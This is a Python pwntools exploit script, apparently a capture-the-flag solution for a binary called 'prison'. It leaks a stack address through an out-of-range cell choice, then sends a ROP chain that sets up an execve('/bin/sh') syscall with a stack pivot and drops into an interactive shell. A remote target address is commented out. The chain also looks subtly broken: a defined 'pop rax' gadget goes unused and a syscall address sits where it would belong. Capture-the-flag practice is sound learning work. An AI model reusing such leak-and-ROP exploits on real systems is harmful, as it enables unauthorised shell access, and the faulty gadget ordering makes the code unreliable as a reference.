from pwn import *

#p = remote("20.84.72.194", 5001)
p = process("./prison")

# first leak address of name buffer
p.sendlineafter(b"cell (1-6):", b"9") #17
p.recvuntil(b"Your cellmate is ")
buffer_stack_addr = int.from_bytes(p.recvline()[:6], "little") - 80

# send the rop chain

pop_rdi = 0x401a0d
pop_rsi_pbp = 0x413676
pop_rax = 0x41f464
syscall = 0x4013b8
pop_rsp = 0x4450f8


payload  = b"/bin/sh\x00"           # 8 byte
payload += p64(pop_rdi)            # pop rdi 8 byte
payload += p64(buffer_stack_addr)   # 8 byte
payload += p64(pop_rsi_pbp)            # pop rsi, pop rbp  8 byte
payload += p64(0)                   # 8 byte
payload += p64(0)                   # 8 byte
payload += p64(syscall)            # pop rax 8 byte
payload += p64(59)                  # execve 8 byte
payload += p64(syscall)            # syscall   8 byte
# --
payload += p64(pop_rsp)            # pop rsp  8 byte  <- initial ret
payload += p64(buffer_stack_addr + 8) #                 8 byte

p.sendlineafter(b"name:", payload)

p.interactive()